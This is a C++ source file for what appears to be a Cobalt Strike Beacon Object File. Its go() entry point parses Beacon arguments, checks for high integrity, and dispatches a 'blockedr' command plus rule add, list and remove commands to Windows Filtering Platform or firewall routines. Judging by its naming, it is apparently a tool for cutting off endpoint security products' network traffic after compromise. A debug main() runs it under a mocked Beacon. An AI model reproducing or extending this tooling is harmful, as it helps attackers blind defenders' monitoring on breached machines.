#include "src/common.h"

#ifdef _DEBUG
#include "base/mock.h"
#endif

extern "C" {

// --- Globals required by the ported code ---
// These are safe in a BOF as they are re-initialized on each run.
BOOL g_isFirewallMode = FALSE;
BOOL g_isQuiet = TRUE; // BOFs are always "quiet"
BOOL g_isForce = FALSE; // Not used in this version
HANDLE g_hHeap = NULL;  // Will be set to the process heap

void go(char* args, int len) {
    datap parser;
    char* command;
    char* arg1 = NULL;

    // Set the heap handle for utility functions to use
    g_hHeap = GetProcessHeap();

    BeaconDataParse(&parser, args, len);
    command = BeaconDataExtract(&parser, NULL);

    if (!command) {
        BeaconPrintf(CALLBACK_ERROR, "No command received.");
        return;
    }

    // Check if the first argument is "--firewall" to set the mode
    if (lstrcmpiA(command, "--firewall") == 0) {
        g_isFirewallMode = TRUE;
        command = BeaconDataExtract(&parser, NULL); // The real command is next
        if (!command) {
            BeaconPrintf(CALLBACK_ERROR, "No command specified after --firewall flag.");
            return;
        }
    } else {
        g_isFirewallMode = FALSE;
    }

    // The next piece of data is the argument for the command (if it exists)
    if (BeaconDataLength(&parser) > 0) {
        arg1 = BeaconDataExtract(&parser, NULL);
    }
    
    if (!CheckProcessIntegrityLevel()) {
        BeaconPrintf(CALLBACK_ERROR, "Error: Must be run from a high-integrity context.");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Executing command: %s in %s mode.", command, g_isFirewallMode ? "Firewall" : "WFP");

    if (lstrcmpiA(command, "blockedr") == 0) {
        g_isFirewallMode ? FirewallConfigureBlockRules() : configureNetworkFilters();
    } 
    else if (lstrcmpiA(command, "list") == 0) {
        if (g_isFirewallMode) {
            BeaconPrintf(CALLBACK_ERROR, "The 'list' command is only available in WFP mode.");
        } else {
            listRules();
        }
    }
    else if (lstrcmpiA(command, "add") == 0) {
        if (!arg1) { BeaconPrintf(CALLBACK_ERROR, "Error: 'add' command requires a process path."); return; }
        g_isFirewallMode ? FirewallAddRuleByPath(arg1) : addProcessRule(arg1);
    }
    else if (lstrcmpiA(command, "remove") == 0) {
        if (!arg1) { BeaconPrintf(CALLBACK_ERROR, "Error: 'remove' command requires an ID or path."); return; }
        if (g_isFirewallMode) {
            FirewallRemoveRuleByPath(arg1);
        } else {
            UINT64 ruleId = CustomStrToULL(arg1, NULL);
            removeRuleById(ruleId);
        }
    }
    else if (lstrcmpiA(command, "removeall") == 0) {
        g_isFirewallMode ? FirewallRemoveAllRules() : removeAllRules();
    } 
    else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown command: %s", command);
    }
}

}

// --- Only define DFR for Release builds ---
#ifndef _DEBUG
#include "src/dfr.h"
#endif

#ifdef _DEBUG
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s [--firewall] <command> [argument]\n", argv[0]);
        printf("Commands: blockedr, add <path>, list, remove <id>, removeall\n");
        return 1;
    }

    // Manually set up the mock environment and pack arguments
    // This replicates the logic from runMocked but handles argv correctly.
    
    // 1. Setup mock Beacon memory
    BEACON_INFO beaconInfo = bof::mock::setupMockBeacon(bof::profile::defaultStage);
    bof::mock::setBeaconInfo(beaconInfo);
    
    // 2. Reset the global output container
    bof::output::reset();

    // 3. Pack the command-line arguments (skipping the program name)
    bof::mock::BofData args;
    for (int i = 1; i < argc; i++) {
        args.pack(argv[i]);
    }

    // 4. Execute the BOF's entry point
    go(args.get(), args.size());

    // The test outputs can be retrieved here using bof::output::getOutputs()

    return 0;
}
#endif